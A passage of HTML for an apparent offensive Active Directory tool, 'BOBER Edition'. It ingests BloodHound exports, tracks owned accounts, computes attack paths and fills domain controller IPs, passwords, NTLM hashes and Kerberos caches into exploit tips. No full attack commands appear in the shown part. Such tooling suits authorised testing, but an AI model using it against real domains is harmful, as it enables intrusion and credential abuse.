.et-block-copy:hover { background:rgba(0,212,255,.18); color:var(--cyan); border-color:var(--cyan); }
.et-comment { color:var(--dim2); margin:3px 0 1px; font-size:.9em; }
</style>
</head>
<body>
<header>
  <div class="logo" style="display:flex;align-items:center;gap:10px">
    <img src="data:image/png;base64,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" style="width:36px;height:36px;border-radius:50%;border:1.5px solid var(--cyan);box-shadow:0 0 10px rgba(0,232,154,.4);flex-shrink:0">
    <span>BOBER <span style="color:var(--dim2);font-weight:400">//</span> <span style="font-size:.7em;letter-spacing:2px;color:var(--green)">EDITION</span></span>
  </div>
  <div style="display:flex;align-items:center;gap:14px">
    <div class="hstats" id="hstats">DROP A ZIP TO BEGIN</div>
    <button class="cfg-btn" onclick="toggleCfg()" id="cfgBtn">⚙ TARGET CONFIG</button>
  </div>
</header>

<!-- Settings Overlay -->
<div class="cfg-overlay hidden" id="cfgOverlay" onclick="if(event.target===this)toggleCfg()">
<div class="cfg-panel">
  <div class="cfg-header">
    <span class="cfg-title">⚙ TARGET CONFIGURATION</span>
    <button class="cfg-close" onclick="toggleCfg()">✕</button>
  </div>
  <div class="cfg-body">
    <div class="cfg-section">
      <div class="cfg-section-title">Network</div>
      <div class="cfg-row">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_dc_ip"></span>DC_IP <span>→ Domain Controller IP</span></label>
        <input class="cfg-input" id="cfg_dc_ip" placeholder="10.10.10.10" oninput="cfgChanged()">
      </div>
      <div class="cfg-row" style="margin-top:8px">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_dc_host"></span>DC_HOST <span>→ DC full hostname (FQDN)</span></label>
        <input class="cfg-input" id="cfg_dc_host" placeholder="dc01.domain.local" oninput="cfgChanged()">
      </div>
      <div class="cfg-row" style="margin-top:8px">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_proxy"></span>PROXY <span>→ proxychains / tunnel prefix (optional)</span></label>
        <input class="cfg-input" id="cfg_proxy" placeholder="proxychains4" oninput="cfgChanged()">
        <div class="cfg-hint">If provided, it is prepended to every command (e.g. proxychains4 nxc ...)</div>
      </div>
    </div>
    <div class="cfg-section">
      <div class="cfg-section-title">Domain & Credentials</div>
      <div class="cfg-row">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_domain"></span>DOMAIN <span>→ domain.local or DOMAIN.HTB</span></label>
        <input class="cfg-input" id="cfg_domain" placeholder="domain.local" oninput="cfgChanged()">
      </div>
      <div class="cfg-row" style="margin-top:8px">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_user"></span>USER <span>→ active / owned account</span></label>
        <input class="cfg-input" id="cfg_user" placeholder="user" oninput="cfgChanged()">
      </div>
      <div class="cfg-row" style="margin-top:8px">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_pass"></span>PASS <span>→ password (optional)</span></label>
        <input class="cfg-input" id="cfg_pass" placeholder="Password123!" oninput="cfgChanged()" type="text" autocomplete="off">
      </div>
      <div class="cfg-row" style="margin-top:8px">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_hash"></span>NTLM_HASH <span>→ NT hash (optional, for PTH)</span></label>
        <input class="cfg-input" id="cfg_hash" placeholder="aad3b435b51404ee:8d67f5a634a447be..." oninput="cfgChanged()">
      </div>
      <div class="cfg-row" style="margin-top:8px">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_ccache"></span>CCACHE <span>→ KRB5CCNAME value (optional)</span></label>
        <input class="cfg-input" id="cfg_ccache" placeholder="user.ccache" oninput="cfgChanged()">
      </div>
    </div>
    <div class="cfg-section">
      <div class="cfg-section-title">Target</div>
      <div class="cfg-row">
        <label class="cfg-label"><span class="cfg-indicator" id="ind_target"></span>TARGET <span>→ target IP or hostname</span></label>
        <input class="cfg-input" id="cfg_target" placeholder="target.domain.local" oninput="cfgChanged()">
      </div>
    </div>
    <div class="cfg-hint" style="padding:6px 0;line-height:1.8">
      💡 Placeholders highlighted in orange in exploit tips (<span style="color:var(--orange)">DC_IP</span>, <span style="color:var(--orange)">domain.local</span>, etc.) are automatically replaced with the configured values.<br>
      The domain is auto-filled when the ZIP is loaded.
    </div>
    <button class="cfg-apply" onclick="applyConfig()">✓ APPLY &amp; CLOSE</button>
  </div>
</div>
</div>
<div class="app">
  <aside>
    <div class="sb-top">
      <div class="sb-title">Starting Points <span class="badge" id="ownedBadge">0 owned</span></div>
      <div id="dropzone" class="dropzone" onclick="document.getElementById('fi').click()">
        <div class="dz-icon">📦</div>
        <div class="dz-text"><b>🦫 DROP BLOODHOUND ZIP</b>or click</div>
      </div>
      <input type="file" id="fi" accept=".zip" style="display:none" onchange="loadZip(this.files[0])">
      <div class="sb-help">Mark controlled accounts or hosts to calculate attack paths.</div>
      <input class="sb-search" id="sbSearch" placeholder="// filter..." oninput="renderSidebar()">
      <div class="sb-filters" id="sbFilters">
        <button class="sb-filter active" onclick="setSidebarFilter('all')">All</button>
        <button class="sb-filter" onclick="setSidebarFilter('users')">Users</button>
        <button class="sb-filter" onclick="setSidebarFilter('computers')">Computers</button>
        <button class="sb-filter" onclick="setSidebarFilter('gmsa')">gMSA</button>
        <button class="sb-filter" onclick="setSidebarFilter('interesting')">Interesting</button>
        <button class="sb-filter" onclick="setSidebarFilter('owned')">Owned</button>
      </div>
    </div>
    <div class="node-list" id="nodeList">
      <div style="padding:16px;text-align:center;color:var(--dim);font-size:.62em;letter-spacing:1px;">Load a ZIP file</div>
    </div>
  </aside>
  <main>
    <div class="tabs" id="tabBar" style="display:none">
      <button class="tab active" onclick="switchTab('paths')">⚔ Attack Paths</button>
      <button class="tab" onclick="switchTab('acls')">📋 ACLs</button>
      <button class="tab" onclick="switchTab('deleg')">🎫 Insights</button>
      <button class="tab" onclick="switchTab('overview')">🗺 Overview</button>
      <button class="tab" onclick="switchTab('graph')">🕸 Graph</button>
      <div class="tab-spacer"></div>
      <div class="object-search hidden" id="objectSearchWrap">
        <input id="objectSearch" placeholder="// search AD objects..." oninput="setObjectSearch(this.value)">
        <button onclick="clearObjectSearch()">CLEAR</button>
      </div>
    </div>
    <div class="content" id="content">
      <div class="welcome">
        <div class="w-icon"><img src="data:image/png;base64,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